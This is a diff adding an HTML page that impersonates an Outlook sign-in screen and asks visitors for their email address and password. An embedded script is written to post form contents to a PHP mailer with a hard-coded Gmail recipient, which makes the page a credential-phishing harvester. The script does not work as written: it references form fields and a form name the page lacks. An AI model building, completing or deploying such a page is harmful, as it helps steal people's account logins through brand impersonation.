@@ -1,0 +1,59 @@
+<html>
+  <head>
+    <title>Login</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+  </head>
+  <body>
+      <div class="login-box">
+            <img src="/images/logo.png" alt="Outlook">
+      <h2>Login with Outlook</h2>
+        <form>
+          <div class="user-box">
+            <input type="text" name="" required="">
+            <label>Email Address</label>
+          </div>
+          <div class="user-box">
+            <input type="text" name="" required="">
+            <label>Password</label>
+          </div>
+          <a href="index.html" class="btn">
+          <input type="submit" value="Submit">
+        </a>
+          <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+        </form>
+    <script>
+        function validateForm() {
+  // Check if all required fields are filled out
+  if (document.forms["myForm"]["name"].value == "" || document.forms["myForm"]["email"].value == "" || document.forms["myForm"]["message"].value == "") {
+    alert("All fields are required");
+    return false;
+  }
+  
+  // Check if email field contains a valid email address
+  var email = document.forms["myForm"]["email"].value;
+  var regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+  if (!regex.test(email)) {
+    alert("Please enter a valid email address");
+    return false;
+  }
+  
+  // Send form data to maxemmily@gmail.com using AJAX
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "send-email.php", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.onreadystatechange = function() {
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+      // Redirect user back to homepage
+      window.location.replace("index.html");
+    }
+  }
+  xhr.send("to=maxemmily@gmail.com&name=" + document.forms["myForm"]["name"].value + "&email=" + document.forms["myForm"]["email"].value + "&message=" + document.forms["myForm"]["message"].value);
+}
+
+        </script>
+      </div>
+  </body>
+</html>
